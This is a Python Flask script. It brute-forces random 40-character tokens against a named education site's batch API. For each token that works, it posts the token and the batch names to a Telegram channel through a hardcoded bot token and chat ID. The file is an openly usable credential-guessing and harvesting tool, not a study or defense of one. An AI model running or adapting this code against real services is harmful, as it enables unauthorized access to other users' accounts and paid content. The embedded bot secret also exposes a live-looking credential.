from flask import Flask, jsonify, request
import random
import string
import requests
from telegram import Bot

# Initialize Flask app
app = Flask(__name__)

# Telegram Bot setup
TELEGRAM_BOT_TOKEN = '7853203368:AAE801naC4GMeyrkEfyflPItRwMvLmQddPY'
CHANNEL_CHAT_ID = '-1002478793346'  # Or chat ID like -1001234567890
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# Function to generate a random 40-character token
def generate_random_token():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=40))

# Route to check tokens and send to Telegram if valid
@app.route('/check', methods=['GET'])
def check_tokens():
    token = generate_random_token()
    url = "https://spec.iitschool.com/api/v1/my-batch"
    
    headers = {
        'Accept': 'application/json',
        'origintype': 'web',
        'token': token,
        'usertype': '2',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json().get('data', {})
        batch_data = data.get('batchData', [])
        if batch_data:
            for batch in batch_data:
                batch_name = batch.get('batchName', 'N/A')
                batch_id = batch.get('id', 'N/A')
                # Send to Telegram
                send_to_telegram(token, batch_name, batch_id)
            return jsonify({
                "token": token,
                "batches": [{"batchName": batch.get('batchName'), "id": batch.get('id')} for batch in batch_data]
            })
    return jsonify({"token": token, "batches": []})

# Function to send a message to the Telegram channel
def send_to_telegram(token, batch_name, batch_id):
    message = f"Token: {token}\n{batch_name} - {batch_id}"
    bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message)

# Health check route (optional for monitoring purposes)
@app.route('/health', methods=['GET'])
def health_check():
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
